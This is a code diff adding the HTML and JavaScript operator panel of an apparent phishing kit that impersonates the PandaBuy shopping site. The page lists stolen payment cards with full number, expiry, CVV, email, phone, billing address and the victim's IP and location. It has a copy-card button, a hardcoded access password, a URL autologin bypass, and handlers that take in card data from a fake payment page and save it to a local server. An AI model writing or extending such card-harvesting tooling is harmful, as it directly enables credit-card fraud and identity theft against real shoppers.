@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Details Monitor - PandaBuy</title>
+    <link rel="icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="shortcut icon" href="https://www.pandabuy.com/static/favicon.ico" type="image/png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .logo h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #2a2a2a;
+        }
+        
+        .monitor-controls {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .admin-nav {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .admin-nav a {
+            padding: 10px 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .admin-nav a:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        button {
+            padding: 8px 16px;
+            background-color: #4a6cf7;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Poppins', sans-serif;
+            font-weight: 500;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        button:hover {
+            background-color: #3a5ce6;
+        }
+        
+        button.danger {
+            background-color: #e53935;
+        }
+        
+        button.danger:hover {
+            background-color: #d32f2f;
+        }
+        
+        button.success {
+            background-color: #43a047;
+        }
+        
+        button.success:hover {
+            background-color: #388e3c;
+        }
+        
+        .card-list {
+            margin-top: 20px;
+        }
+        
+        .status-bar {
+            background-color: #e8f4fd;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .status-bar i {
+            color: #4a6cf7;
+            font-size: 1.2rem;
+        }
+        
+        .status-text {
+            font-weight: 500;
+            color: #4a6cf7;
+        }
+        
+        .card-item {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #4a6cf7;
+            position: relative;
+        }
+        
+        .card-item.new {
+            border-left-color: #4caf50;
+            animation: highlightNew 2s ease-in-out;
+        }
+        
+        @keyframes highlightNew {
+            0% { background-color: rgba(76, 175, 80, 0.1); }
+            100% { background-color: white; }
+        }
+        
+        /* Login overlay styles */
+        .login-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+        
+        .login-logo {
+            margin-bottom: 20px;
+        }
+        
+        .login-logo img {
+            height: 50px;
+        }
+        
+        .login-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .login-subtitle {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 0.9rem;
+        }
+        
+        .login-form {
+            text-align: left;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: border 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #4a6cf7;
+            outline: none;
+        }
+        
+        .error-message {
+            color: #e53935;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4a6cf7;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin-top: 10px;
+        }
+        
+        .login-button:hover {
+            background-color: #3a5ce6;
+        }
+        
+        /* Remaining existing styles */
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 10px;
+        }
+        
+        .card-title {
+            font-weight: 600;
+            color: #2a2a2a;
+            font-size: 1.1rem;
+        }
+        
+        .card-timestamp {
+            color: #888;
+            font-size: 0.85rem;
+        }
+        
+        .card-data {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .data-group {
+            margin-bottom: 10px;
+        }
+        
+        .data-label {
+            color: #777;
+            font-size: 0.85rem;
+            margin-bottom: 3px;
+        }
+        
+        .data-value {
+            font-weight: 500;
+            font-size: 0.95rem;
+            word-break: break-word;
+        }
+        
+        .card-highlight {
+            color: #d32f2f;
+            font-weight: 600;
+        }
+        
+        .card-actions {
+            margin-top: 15px;
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        
+        .card-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 4px 8px;
+            background-color: #4caf50;
+            color: white;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+        
+        .empty-state i {
+            font-size: 3rem;
+            color: #ccc;
+            margin-bottom: 15px;
+        }
+        
+        .empty-state h3 {
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .empty-state p {
+            color: #888;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 20px;
+        }
+        
+        .auto-refresh input {
+            margin-right: 5px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .card-data {
+                grid-template-columns: 1fr;
+            }
+            
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 15px;
+            }
+            
+            .monitor-controls {
+                width: 100%;
+                justify-content: space-between;
+            }
+        }
+        
+        /* Style for notification toast */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 4px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            z-index: 1000;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.3s, transform 0.3s;
+        }
+        
+        .notification.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .notification.error {
+            background-color: #f44336;
+        }
+        
+        .notification.success {
+            background-color: #4CAF50;
+        }
+        
+        .loading-cards {
+            padding: 20px;
+            text-align: center;
+            color: #4a6cf7;
+            font-weight: 500;
+            background-color: rgba(74, 108, 247, 0.05);
+            border-radius: 8px;
+            margin: 20px 0;
+            position: relative;
+            padding-bottom: 40px;
+        }
+        
+        .loading-cards:after {
+            content: "";
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            width: 40px;
+            height: 4px;
+            background-color: #4a6cf7;
+            border-radius: 2px;
+            transform: translateX(-50%);
+            animation: loading-pulse 1.5s infinite ease-in-out;
+        }
+        
+        @keyframes loading-pulse {
+            0% { width: 40px; opacity: 0.6; }
+            50% { width: 100px; opacity: 1; }
+            100% { width: 40px; opacity: 0.6; }
+        }
+        
+        /* Card highlight style */
+        .card.highlighted {
+            border-left: 4px solid #ff9800;
+            background-color: rgba(255, 152, 0, 0.05);
+            box-shadow: 0 4px 12px rgba(255, 152, 0, 0.15);
+        }
+        
+        /* Hidden class for visitor details */
+        .hidden {
+            display: none;
+        }
+        
+        /* Visitor details styling */
+        .visitor-details {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f9f9f9;
+            border-radius: 4px;
+        }
+        
+        .visitor-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .visitor-table td {
+            padding: 5px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .visitor-table td:first-child {
+            font-weight: 500;
+            width: 40%;
+        }
+    </style>
+</head>
+<body>
+    <div id="passwordProtection" class="login-overlay">
+        <div class="login-container">
+            <div class="login-logo">
+                <img src="https://www.pandabuy.com/static/img/logo.png" alt="PandaBuy Logo">
+            </div>
+            <h2 class="login-title">Secure Access</h2>
+            <p class="login-subtitle">Enter the password to access collected card details</p>
+            <div class="login-form">
+                <div class="form-group">
+                    <label for="passwordInput">Password</label>
+                    <input type="password" id="passwordInput" placeholder="Enter your password">
+                    <div class="error-message">Incorrect password. Please try again.</div>
+                </div>
+                <button class="login-button" onclick="checkPassword()">
+                    <i class="fas fa-lock"></i> Access Details
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="cardsContainer" class="container" style="display: none;">
+        <div class="header">
+            <div class="logo">
+                <img src="https://www.pandabuy.com/static/img/logo.png" alt="PandaBuy Logo">
+                <h1>Card Details Monitor</h1>
+            </div>
+            <div class="monitor-controls">
+                <button onclick="loadCards()">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+                <button class="danger" onclick="clearCards()">
+                    <i class="fas fa-trash-alt"></i> Clear All
+                </button>
+            </div>
+        </div>
+        
+        <div class="admin-nav">
+            <a href="admin-cards.html">
+                <i class="fas fa-credit-card"></i>
+                Advanced Card Panel
+            </a>
+            <a href="admin-visits.html">
+                <i class="fas fa-chart-line"></i>
+                Live Visits Monitor
+            </a>
+        </div>
+        
+        <div class="status-bar">
+            <i class="fas fa-info-circle"></i>
+            <span class="status-text">Currently tracking <span id="cardCount">0</span> card entries</span>
+        </div>
+        
+        <div id="cards" class="card-list">
+            <!-- Cards will be dynamically loaded here -->
+            <div class="loading">Loading cards...</div>
+        </div>
+    </div>
+
+    <!-- Hidden form to receive POST data -->
+    <div id="dataReceiver" style="display:none;">
+        <form id="postDataForm">
+            <input type="hidden" name="cardData" id="cardDataInput" value="">
+        </form>
+    </div>
+
+    <script>
+    // Password protection for the page
+    function checkPassword() {
+        const enteredPassword = document.getElementById('passwordInput').value;
+        const correctPassword = "rapedraw123.@"; // Simple password storage
+        
+        if (enteredPassword === correctPassword) {
+            document.getElementById('passwordProtection').style.display = 'none';
+            document.getElementById('cardsContainer').style.display = 'block';
+            loadCards();
+        } else {
+            alert('Incorrect password!');
+        }
+    }
+    
+    // Function to load and display cards
+    function loadCards() {
+        try {
+            console.log('Loading cards...');
+            
+            // First check URL parameters (for direct data passing)
+            const urlParams = new URLSearchParams(window.location.search);
+            const dataParam = urlParams.get('data');
+            const autoLogin = urlParams.get('autologin');
+            const forceSave = urlParams.get('forcesave');
+            
+            // Auto-login if the secret parameter is provided
+            if (autoLogin === 'secret') {
+                console.log('Auto-login activated via URL param');
+                document.getElementById('passwordProtection').style.display = 'none';
+                document.getElementById('cardsContainer').style.display = 'block';
+            }
+            
+            // Handle direct data passing via URL
+            if (dataParam) {
+                try {
+                    const urlData = JSON.parse(decodeURIComponent(dataParam));
+                    console.log('Received data via URL param:', urlData);
+                    
+                    // Save the data to localStorage if needed
+                    if (forceSave === 'true' || autoLogin === 'secret') {
+                        saveCardData(urlData);
+                    }
+                    
+                    // Display this card at the top
+                    displayCard(urlData, true);
+                } catch (e) {
+                    console.error('Error parsing URL data:', e);
+                }
+            }
+            
+            // Look for POST data in form
+            const cardDataInput = document.getElementById('cardDataInput');
+            if (cardDataInput && cardDataInput.value) {
+                try {
+                    console.log('Found POST data in form:', cardDataInput.value);
+                    const postData = JSON.parse(cardDataInput.value);
+                    saveCardData(postData);
+                    displayCard(postData, true);
+                } catch (e) {
+                    console.error('Error parsing POST data from form:', e);
+                }
+            }
+            
+            // Show loading state
+            const cardsContainer = document.getElementById('cards');
+            cardsContainer.innerHTML = '<div class="loading-cards">Loading cards from server...</div>';
+            
+            // Fetch cards from server
+            fetch('http://localhost:3000/api/cards')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(serverCards => {
+                    console.log(`Loaded ${serverCards.length} cards from server`);
+                    
+                    // Display cards
+                    cardsContainer.innerHTML = ''; // Clear existing cards
+                    
+                    if (serverCards.length === 0) {
+                        cardsContainer.innerHTML = '<div class="no-cards">No cards collected yet</div>';
+                        return;
+                    }
+                    
+                    // Sort cards by timestamp (newest first)
+                    serverCards.sort((a, b) => {
+                        const dateA = new Date(a.serverTimestamp || a.timestamp || 0);
+                        const dateB = new Date(b.serverTimestamp || b.timestamp || 0);
+                        return dateB - dateA;
+                    });
+                    
+                    // Display each card
+                    serverCards.forEach((card, index) => displayCard(card, index === 0));
+                    
+                    // Update the card count
+                    document.getElementById('cardCount').textContent = serverCards.length;
+                    
+                    // Also update localStorage for offline access
+                    try {
+                        localStorage.setItem('collectedCards', JSON.stringify(serverCards));
+                        if (serverCards.length > 0) {
+                            localStorage.setItem('mostRecentCard', JSON.stringify(serverCards[0]));
+                        }
+                    } catch (e) {
+                        console.error('Error updating localStorage:', e);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching cards from server:', error);
+                    
+                    // Fallback to localStorage if server fetch fails
+                    console.log('Falling back to localStorage data');
+                    loadCardsFromLocalStorage();
+                    
+                    // Show error notification
+                    showNotification('Failed to load cards from server. Using local data instead.', true);
+                });
+        } catch (e) {
+            console.error('Error in loadCards:', e);
+            document.getElementById('cards').innerHTML = 
+                `<div class="error-message">Error loading cards: ${e.message}</div>`;
+        }
+    }
+    
+    // Fallback function to load cards from localStorage
+    function loadCardsFromLocalStorage() {
+        try {
+            // Get cards from localStorage
+            let cards = [];
+            try {
+                const storedCards = localStorage.getItem('collectedCards');
+                cards = storedCards ? JSON.parse(storedCards) : [];
+                
+                // Check if parsing returned an array
+                if (!Array.isArray(cards)) {
+                    console.error('Stored cards is not an array');
+                    cards = [];
+                }
+            } catch (e) {
+                console.error('Error loading cards from localStorage:', e);
+                cards = [];
+            }
+            
+            // Display cards
+            const cardsContainer = document.getElementById('cards');
+            cardsContainer.innerHTML = ''; // Clear existing cards
+            
+            if (cards.length === 0) {
+                cardsContainer.innerHTML = '<div class="no-cards">No cards collected yet</div>';
+                return;
+            }
+            
+            // Sort cards by timestamp (newest first)
+            cards.sort((a, b) => {
+                const dateA = new Date(a.timestamp || 0);
+                const dateB = new Date(b.timestamp || 0);
+                return dateB - dateA;
+            });
+            
+            // Display each card
+            cards.forEach(card => displayCard(card));
+            
+            // Update the card count
+            document.getElementById('cardCount').textContent = cards.length;
+        } catch (e) {
+            console.error('Error in loadCardsFromLocalStorage:', e);
+            document.getElementById('cards').innerHTML = 
+                `<div class="error-message">Error loading local cards: ${e.message}</div>`;
+        }
+    }
+    
+    // Function to save card data to server and localStorage
+    function saveCardData(data) {
+        try {
+            console.log('Saving card data:', data);
+            
+            // Add timestamp if not present
+            if (!data.timestamp) {
+                data.timestamp = new Date().toLocaleString();
+            }
+            
+            // First, save to server
+            fetch('http://localhost:3000/api/cards', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(responseData => {
+                console.log('Server response:', responseData);
+                if (responseData.success) {
+                    console.log('Card data successfully saved to server');
+                    showNotification('Card data saved to server successfully!');
+                    
+                    // Reload cards to show the latest data from server
+                    loadCards();
+                } else {
+                    console.error('Server reported error:', responseData.error);
+                    showNotification('Error saving to server. Data saved locally only.', true);
+                    
+                    // Save to localStorage as fallback
+                    saveToLocalStorage(data);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending data to server:', error);
+                showNotification('Error connecting to server. Data saved locally only.', true);
+                
+                // Save to localStorage as fallback
+                saveToLocalStorage(data);
+            });
+        } catch (e) {
+            console.error('Error in saveCardData:', e);
+            showNotification('Error saving card data.', true);
+            
+            // Try to save locally as last resort
+            try {
+                saveToLocalStorage(data);
+            } catch (localError) {
+                console.error('Failed to save locally too:', localError);
+            }
+        }
+    }
+    
+    // Helper function to save to localStorage
+    function saveToLocalStorage(data) {
+        try {
+            // Get existing cards
+            let existingCards = [];
+            try {
+                const storedCards = localStorage.getItem('collectedCards');
+                existingCards = storedCards ? JSON.parse(storedCards) : [];
+                
+                // Check if parsing returned an array
+                if (!Array.isArray(existingCards)) {
+                    console.error('Stored cards is not an array, resetting');
+                    existingCards = [];
+                }
+            } catch (e) {
+                console.error('Error parsing stored cards:', e);
+                existingCards = [];
+            }
+            
+            // Check if this card is already in the list (avoid duplicates)
+            const isDuplicate = existingCards.some(card => 
+                card.cardNumber === data.cardNumber && 
+                card.expiration === data.expiration);
+                
+            if (!isDuplicate) {
+                existingCards.push(data);
+                
+                // Save back to localStorage
+                localStorage.setItem('collectedCards', JSON.stringify(existingCards));
+                console.log('Card saved successfully to localStorage');
+                
+                // Also update the most recent card
+                localStorage.setItem('mostRecentCard', JSON.stringify(data));
+                
+                // Update the card count
+                document.getElementById('cardCount').textContent = existingCards.length;
+            } else {
+                console.log('Duplicate card not saved to localStorage');
+            }
+        } catch (e) {
+            console.error('Error saving to localStorage:', e);
+        }
+    }
+    
+    // Function to display a card
+    function displayCard(card, isHighlighted = false) {
+        const cardsContainer = document.getElementById('cards');
+        
+        // Create card element
+        const cardElement = document.createElement('div');
+        cardElement.className = `card ${isHighlighted ? 'highlighted' : ''}`;
+        
+        // Format the card data
+        const cardBrand = getCardBrand(card.cardNumber);
+        const lastFour = card.cardNumber.slice(-4);
+        const timestamp = card.timestamp || 'Unknown date';
+        
+        // Create HTML structure for the card
+        cardElement.innerHTML = `
+            <div class="card-header">
+                <span class="card-brand ${cardBrand.toLowerCase()}">${cardBrand}</span>
+                <span class="card-time">${timestamp}</span>
+            </div>
+            <div class="card-body">
+                <div class="card-row">
+                    <span class="card-label">Cardholder:</span>
+                    <span class="card-value">${card.cardName || 'N/A'}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">Card Number:</span>
+                    <span class="card-value">${formatCardNumber(card.cardNumber)}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">Expiration:</span>
+                    <span class="card-value">${card.expiration || 'N/A'}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">CVV:</span>
+                    <span class="card-value">${card.cvv || 'N/A'}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">Email:</span>
+                    <span class="card-value">${card.email || 'N/A'}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">Phone:</span>
+                    <span class="card-value">${card.phoneNumber || 'N/A'}</span>
+                </div>
+                <div class="card-row">
+                    <span class="card-label">Address:</span>
+                    <span class="card-value">${formatAddress(card)}</span>
+                </div>
+            </div>
+            <div class="card-footer">
+                <button class="copy-btn" onclick="copyCardDetails('${card.cardNumber}', '${card.expiration}', '${card.cvv}')">Copy Card</button>
+                <button class="details-btn" onclick="toggleVisitorDetails(this)">View Visitor Info</button>
+            </div>
+            <div class="visitor-details hidden">
+                <h4>Visitor Information</h4>
+                ${formatVisitorData(card.visitor)}
+            </div>
+        `;
+        
+        // Add card to container
+        if (isHighlighted) {
+            // If highlighted, add to the top
+            cardsContainer.insertBefore(cardElement, cardsContainer.firstChild);
+        } else {
+            cardsContainer.appendChild(cardElement);
+        }
+    }
+    
+    // Function to format card number with spaces
+    function formatCardNumber(number) {
+        if (!number) return 'N/A';
+        // Remove any non-digit characters
+        const digits = number.replace(/\D/g, '');
+        // Format with spaces
+        return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+    }
+    
+    // Function to determine card brand based on card number
+    function getCardBrand(cardNumber) {
+        if (!cardNumber) return 'Unknown';
+        
+        // Remove spaces and non-digit characters
+        const number = cardNumber.replace(/\D/g, '');
+        
+        // Check card type based on first digits
+        if (/^4/.test(number)) return 'Visa';
+        if (/^5[1-5]/.test(number)) return 'MasterCard';
+        if (/^3[47]/.test(number)) return 'American Express';
+        if (/^6(?:011|5)/.test(number)) return 'Discover';
+        if (/^35(?:2[89]|[3-8])/.test(number)) return 'JCB';
+        if (/^30[0-5]/.test(number)) return 'Diners Club';
+        if (/^3(?:0[0-5]|[68])/.test(number)) return 'Diners Club';
+        return 'Unknown';
+    }
+    
+    // Function to format address
+    function formatAddress(card) {
+        if (!card.billingAddress) return 'N/A';
+        
+        let address = card.billingAddress;
+        
+        if (card.addressLine2) {
+            address += `, ${card.addressLine2}`;
+        }
+        
+        if (card.city) {
+            address += `, ${card.city}`;
+        }
+        
+        if (card.state) {
+            address += `, ${card.state}`;
+        }
+        
+        if (card.zipCode) {
+            address += ` ${card.zipCode}`;
+        }
+        
+        if (card.country) {
+            address += `, ${card.country}`;
+        }
+        
+        return address;
+    }
+    
+    // Function to format visitor data
+    function formatVisitorData(visitor) {
+        if (!visitor) return '<p>No visitor data available</p>';
+        
+        let html = '<table class="visitor-table">';
+        
+        // Browser and device info
+        html += `
+            <tr>
+                <td>Browser:</td>
+                <td>${visitor.browser || 'Unknown'}</td>
+            </tr>
+            <tr>
+                <td>OS:</td>
+                <td>${visitor.os || 'Unknown'}</td>
+            </tr>
+            <tr>
+                <td>Device:</td>
+                <td>${visitor.device || 'Unknown'}</td>
+            </tr>
+        `;
+        
+        // IP and location info if available
+        if (visitor.ip) {
+            html += `
+                <tr>
+                    <td>IP Address:</td>
+                    <td>${visitor.ip}</td>
+                </tr>
+            `;
+        }
+        
+        if (visitor.location) {
+            html += `
+                <tr>
+                    <td>Location:</td>
+                    <td>${visitor.location}</td>
+                </tr>
+            `;
+        }
+        
+        // Referrer if available
+        if (visitor.referrer) {
+            html += `
+                <tr>
+                    <td>Referrer:</td>
+                    <td>${visitor.referrer}</td>
+                </tr>
+            `;
+        }
+        
+        // Screen size if available
+        if (visitor.screenSize) {
+            html += `
+                <tr>
+                    <td>Screen Size:</td>
+                    <td>${visitor.screenSize}</td>
+                </tr>
+            `;
+        }
+        
+        // Visit time if available
+        if (visitor.visitTime) {
+            html += `
+                <tr>
+                    <td>Visit Time:</td>
+                    <td>${visitor.visitTime}</td>
+                </tr>
+            `;
+        }
+        
+        html += '</table>';
+        return html;
+    }
+    
+    // Function to copy card details to clipboard
+    function copyCardDetails(cardNumber, expiration, cvv) {
+        const textToCopy = `Card: ${formatCardNumber(cardNumber)}\nExp: ${expiration}\nCVV: ${cvv}`;
+        
+        // Create a temporary textarea element
+        const textarea = document.createElement('textarea');
+        textarea.value = textToCopy;
+        textarea.style.position = 'fixed';  // Prevent scrolling to bottom
+        document.body.appendChild(textarea);
+        textarea.select();
+        
+        try {
+            // Execute copy command
+            document.execCommand('copy');
+            showNotification('Card details copied to clipboard!');
+        } catch (err) {
+            console.error('Error copying text: ', err);
+            showNotification('Failed to copy card details', true);
+        }
+        
+        // Remove the textarea
+        document.body.removeChild(textarea);
+    }
+    
+    // Function to toggle visitor details visibility
+    function toggleVisitorDetails(button) {
+        const detailsSection = button.parentElement.nextElementSibling;
+        detailsSection.classList.toggle('hidden');
+        button.textContent = detailsSection.classList.contains('hidden') ? 
+            'View Visitor Info' : 'Hide Visitor Info';
+    }
+    
+    // Function to show notification
+    function showNotification(message, isError = false) {
+        const notification = document.createElement('div');
+        notification.className = `notification ${isError ? 'error' : 'success'}`;
+        notification.textContent = message;
+        
+        document.body.appendChild(notification);
+        
+        // Show notification with animation
+        setTimeout(() => {
+            notification.classList.add('show');
+        }, 10);
+        
+        // Remove after 3 seconds
+        setTimeout(() => {
+            notification.classList.remove('show');
+            setTimeout(() => {
+                document.body.removeChild(notification);
+            }, 300);
+        }, 3000);
+    }
+    
+    // Function to clear all cards
+    function clearCards() {
+        if (confirm('Are you sure you want to clear all stored cards? This will remove them from both the server and local storage.')) {
+            // First clear from server
+            fetch('http://localhost:3000/api/cards', {
+                method: 'DELETE'
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Server response for clear:', data);
+                if (data.success) {
+                    console.log('All cards cleared from server');
+                    showNotification('All cards have been cleared from server');
+                } else {
+                    console.error('Error clearing cards from server:', data.error);
+                    showNotification('Error clearing cards from server', true);
+                }
+            })
+            .catch(error => {
+                console.error('Error connecting to server for clear:', error);
+                showNotification('Error connecting to server. Cards cleared locally only.', true);
+            })
+            .finally(() => {
+                // Also clear from localStorage
+                localStorage.removeItem('collectedCards');
+                localStorage.removeItem('mostRecentCard');
+                document.getElementById('cards').innerHTML = '<div class="no-cards">No cards collected yet</div>';
+                document.getElementById('cardCount').textContent = '0';
+            });
+        }
+    }
+    
+    // Listen for messages from other windows/tabs
+    window.addEventListener('message', function(event) {
+        console.log('Message received in details-cards.html:', event.data);
+        
+        if (event.data && event.data.type === 'newCardData') {
+            const cardData = event.data.cardData;
+            console.log('New card data received via postMessage:', cardData);
+            
+            // Make sure we're logged in before saving
+            if (document.getElementById('passwordProtection').style.display === 'none') {
+                // Save the card data and refresh the display
+                saveCardData(cardData);
+                loadCards();
+            } else {
+                // Store temporarily until logged in
+                localStorage.setItem('pendingCardData', JSON.stringify(cardData));
+            }
+        }
+    });
+    
+    // Check for auto-login on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const autoLogin = urlParams.get('autologin');
+        
+        // Process POST data if it exists
+        if (document.referrer && document.referrer.includes('payment')) {
+            console.log('Came from payment page, checking for POST data');
+            
+            // Look for form data
+            const formData = new FormData(document.getElementById('postDataForm'));
+            if (formData && formData.has('cardData')) {
+                try {
+                    const postData = JSON.parse(formData.get('cardData'));
+                    console.log('Found POST data:', postData);
+                    
+                    // Store temporarily if not logged in yet
+                    if (autoLogin !== 'secret') {
+                        localStorage.setItem('pendingCardData', JSON.stringify(postData));
+                    }
+                } catch (e) {
+                    console.error('Error processing POST data:', e);
+                }
+            }
+        }
+        
+        if (autoLogin === 'secret') {
+            console.log('Auto-login activated');
+            document.getElementById('passwordProtection').style.display = 'none';
+            document.getElementById('cardsContainer').style.display = 'block';
+            loadCards();
+            
+            // Check for pending card data
+            const pendingData = localStorage.getItem('pendingCardData');
+            if (pendingData) {
+                try {
+                    const cardData = JSON.parse(pendingData);
+                    saveCardData(cardData);
+                    localStorage.removeItem('pendingCardData');
+                    loadCards();
+                } catch (e) {
+                    console.error('Error processing pending card data:', e);
+                }
+            }
+        }
+    });
+    </script>
+</body>
+</html> 
